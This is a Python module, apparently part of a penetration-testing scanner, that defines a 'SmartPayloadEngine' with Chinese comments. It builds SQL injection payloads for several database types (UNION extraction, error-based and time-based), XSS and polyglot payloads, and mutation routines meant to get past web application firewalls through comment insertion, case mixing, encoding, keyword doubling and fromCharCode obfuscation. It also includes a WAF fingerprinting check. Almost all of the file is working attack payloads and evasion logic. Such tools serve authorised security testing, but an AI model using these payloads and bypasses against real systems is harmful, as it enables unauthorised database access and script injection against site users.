"""Smart Payload Engine - 動態 Payload 生成與變異 (P2)

實現：
1. SQL 注入語法樹變異（空白繞過、大小寫混淆、內聯註釋）
2. XSS Payload 變異（標籤替換、編碼混淆）
3. 環境感知組裝（根據目標數據庫類型生成對應 Payload）
4. WAF 繞過策略
"""

import random
import re
from typing import List, Dict, Any, Optional
from enum import Enum
import urllib.parse

from aiva_common.utils.logging import get_logger

logger = get_logger(__name__)

# 常量定義
SQL_BASIC_PAYLOAD = "' OR '1'='1"
SCRIPT_TAG_START = "<script>"
SCRIPT_TAG_END = "</script>"
ALERT_PAYLOAD = "alert(1)"


class DatabaseType(str, Enum):
    """數據庫類型枚舉"""
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    SQLITE = "sqlite"
    MONGODB = "mongodb"
    UNKNOWN = "unknown"


class PayloadType(str, Enum):
    """Payload 類型"""
    SQLI = "sqli"
    XSS = "xss"
    XXE = "xxe"
    SSRF = "ssrf"
    CMD_INJECTION = "cmd_injection"


class SmartPayloadEngine:
    """智能 Payload 引擎
    
    職責：
    1. 動態生成變異 Payload（移除靜態模板）
    2. 語法樹變異（AST Mutation）
    3. 環境感知組裝（根據目標環境調整）
    4. WAF 繞過策略
    """
    
    def __init__(self):
        self._sqli_base_payloads = {
            DatabaseType.MYSQL: [
                SQL_BASIC_PAYLOAD,
                "' UNION SELECT NULL, version(), database()-- -",
                "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT @@version), 0x3a, FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)-- -"
            ],
            DatabaseType.POSTGRESQL: [
                SQL_BASIC_PAYLOAD,
                "' UNION SELECT NULL, version(), current_database()-- -",
                "'; SELECT pg_sleep(5)-- -"
            ],
            DatabaseType.MSSQL: [
                SQL_BASIC_PAYLOAD,
                "' UNION SELECT NULL, @@version, db_name()-- -",
                "'; WAITFOR DELAY '00:00:05'-- -"
            ],
            DatabaseType.SQLITE: [
                SQL_BASIC_PAYLOAD,
                "' UNION SELECT NULL, sqlite_version(), 'db'-- -"
            ]
        }
        
        self._xss_base_payloads = [
            f"{SCRIPT_TAG_START}{ALERT_PAYLOAD}{SCRIPT_TAG_END}",
            f"<img src=x onerror={ALERT_PAYLOAD}>",
            f"<svg onload={ALERT_PAYLOAD}>",
            f"<iframe src=javascript:{ALERT_PAYLOAD}>",
            f"javascript:{ALERT_PAYLOAD}",
            f"<body onload={ALERT_PAYLOAD}>"
        ]
        
        logger.info("SmartPayloadEngine initialized")
    
    def generate_sqli_payloads(
        self, 
        db_type: DatabaseType = DatabaseType.UNKNOWN,
        bypass_waf: bool = False,
        mutation_level: int = 3
    ) -> List[str]:
        """生成 SQL 注入 Payload
        
        Args:
            db_type: 目標數據庫類型
            bypass_waf: 是否啟用 WAF 繞過
            mutation_level: 變異等級（1-5）
        
        Returns:
            變異後的 Payload 列表
        """
        # 選擇基礎 Payload
        if db_type in self._sqli_base_payloads:
            base_payloads = self._sqli_base_payloads[db_type]
        else:
            # 未知類型，混合所有 Payload
            base_payloads = []
            for payloads in self._sqli_base_payloads.values():
                base_payloads.extend(payloads)
        
        # 對每個基礎 Payload 進行變異
        mutated = []
        for payload in base_payloads:
            mutated.append(payload)  # 原始版本
            
            if mutation_level >= 1:
                mutated.append(self._mutate_sql_whitespace(payload))
            
            if mutation_level >= 2:
                mutated.append(self._mutate_sql_case(payload))
            
            if mutation_level >= 3:
                mutated.append(self._mutate_sql_comment(payload))
            
            if mutation_level >= 4 and bypass_waf:
                mutated.append(self._mutate_sql_encoding(payload))
            
            if mutation_level >= 5:
                mutated.append(self._mutate_sql_obfuscation(payload))
        
        # 去重
        mutated = list(set(mutated))
        
        logger.info(f"Generated {len(mutated)} SQLi payloads (db={db_type}, level={mutation_level})")
        return mutated
    
    def _mutate_sql_whitespace(self, payload: str) -> str:
        """空白繞過變異
        
        Example:
            "UNION SELECT" -> "UNION/**/SELECT"
            "UNION SELECT" -> "UNION%0ASELECT"
        """
        # 使用內聯註釋替換空白
        payload = payload.replace(" ", "/**/")
        return payload
    
    def _mutate_sql_case(self, payload: str) -> str:
        """大小寫混淆變異
        
        Example:
            "UNION SELECT" -> "UnIoN SeLeCt"
        """
        result = []
        for char in payload:
            if char.isalpha():
                result.append(char.upper() if random.random() > 0.5 else char.lower())
            else:
                result.append(char)
        return ''.join(result)
    
    def _mutate_sql_comment(self, payload: str) -> str:
        """內聯註釋變異
        
        Example:
            "UNION SELECT" -> "/*! UNION */ SELECT"
            "UNION SELECT" -> "UNION/*!50000SELECT*/"
        """
        # MySQL 版本特定註釋
        keywords = ["UNION", "SELECT", "FROM", "WHERE", "AND", "OR"]
        for keyword in keywords:
            if keyword in payload:
                payload = payload.replace(keyword, f"/*!50000{keyword}*/", 1)
                break
        return payload
    
    def _mutate_sql_encoding(self, payload: str) -> str:
        """編碼混淆變異
        
        Example:
            "'" -> "%27"
            "SELECT" -> "SEL%45CT"
        """
        # URL 編碼關鍵字符
        encoded = urllib.parse.quote(payload, safe='')
        return encoded
    
    def _mutate_sql_obfuscation(self, payload: str) -> str:
        """高級混淆變異
        
        Example:
            "1=1" -> "1 LIKE 1"
            "SELECT" -> "SELSELECTECT" (雙寫繞過過濾)
        """
        # 雙寫關鍵字（繞過簡單的字符串替換過濾）
        payload = payload.replace("UNION", "UNUNIONION")
        payload = payload.replace("SELECT", "SELSELECTECT")
        return payload
    
    def generate_xss_payloads(
        self,
        context: str = "html",  # html, attribute, javascript, url
        bypass_waf: bool = False,
        mutation_level: int = 3
    ) -> List[str]:
        """生成 XSS Payload
        
        Args:
            context: 注入上下文（HTML、屬性、JS、URL）
            bypass_waf: 是否啟用 WAF 繞過
            mutation_level: 變異等級
        
        Returns:
            變異後的 Payload 列表
        """
        mutated = []
        
        for payload in self._xss_base_payloads:
            mutated.append(payload)  # 原始版本
            
            if mutation_level >= 1:
                mutated.append(self._mutate_xss_tag(payload))
            
            if mutation_level >= 2:
                mutated.append(self._mutate_xss_encoding(payload))
            
            if mutation_level >= 3 and bypass_waf:
                mutated.append(self._mutate_xss_obfuscation(payload))
        
        # 根據上下文調整
        if context == "attribute":
            mutated = [p.replace('"', '&quot;').replace("'", '&#39;') for p in mutated]
        elif context == "javascript":
            mutated = [f'";{p}//' for p in mutated]
        elif context == "url":
            mutated = [urllib.parse.quote(p) for p in mutated]
        
        mutated = list(set(mutated))
        
        logger.info(f"Generated {len(mutated)} XSS payloads (context={context}, level={mutation_level})")
        return mutated
    
    def _mutate_xss_tag(self, payload: str) -> str:
        """標籤替換變異
        
        Example:
            f"{SCRIPT_TAG_START}{ALERT_PAYLOAD}{SCRIPT_TAG_END}" -> f"<img src=x onerror={ALERT_PAYLOAD}>"
        """
        # <script> -> <svg>, <img>, <iframe>
        if SCRIPT_TAG_START in payload:
            replacement = random.choice([
                payload.replace(SCRIPT_TAG_START, "<svg onload=").replace(SCRIPT_TAG_END, ">"),
                payload.replace(SCRIPT_TAG_START, "<img src=x onerror=").replace(SCRIPT_TAG_END, ">"),
                payload.replace(SCRIPT_TAG_START, "<body onload=").replace(SCRIPT_TAG_END, ">")
            ])
            return replacement
        return payload
    
    def _mutate_xss_encoding(self, payload: str) -> str:
        """編碼混淆變異
        
        Example:
            "<script>" -> "&lt;script&gt;" (HTML Entity)
            "alert" -> "\\u0061lert" (Unicode)
        """
        # HTML Entity 編碼
        payload = payload.replace("<", "&lt;").replace(">", "&gt;")
        
        # Unicode 編碼部分字符
        if "alert" in payload:
            payload = payload.replace("alert", "\\u0061lert")
        
        return payload
    
    def _mutate_xss_obfuscation(self, payload: str) -> str:
        """高級混淆變異
        
        Example:
            "alert(1)" -> "eval(String.fromCharCode(97,108,101,114,116,40,49,41))"
        """
        # 使用 String.fromCharCode 編碼
        if "alert(1)" in payload:
            char_codes = [str(ord(c)) for c in "alert(1)"]
            obfuscated = f"eval(String.fromCharCode({','.join(char_codes)}))"
            return payload.replace("alert(1)", obfuscated)
        
        return payload
    
    def generate_polyglot_payload(self) -> str:
        """生成多語言 Polyglot Payload
        
        可以在多種上下文中觸發（HTML, JS, SQL）
        
        Returns:
            Polyglot Payload
        """
        return "javascript://%250Aalert(1)//';/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//"
    
    def detect_waf(self, response_headers: Dict[str, str], response_body: str) -> bool:
        """檢測 WAF 存在
        
        Args:
            response_headers: HTTP 響應頭
            response_body: 響應體
        
        Returns:
            是否檢測到 WAF
        """
        # 檢查響應頭特徵
        waf_headers = ["x-sucuri-id", "x-waf", "cloudflare", "akamai", "imperva"]
        for header, value in response_headers.items():
            header_lower = header.lower()
            value_lower = value.lower()
            for waf_sig in waf_headers:
                if waf_sig in header_lower or waf_sig in value_lower:
                    logger.info(f"WAF detected: {header}={value}")
                    return True
        
        # 檢查響應體特徵
        waf_body_patterns = [
            r"access denied",
            r"blocked by security policy",
            r"web application firewall",
            r"cloudflare ray id"
        ]
        for pattern in waf_body_patterns:
            if re.search(pattern, response_body, re.IGNORECASE):
                logger.info(f"WAF detected in body: {pattern}")
                return True
        
        return False
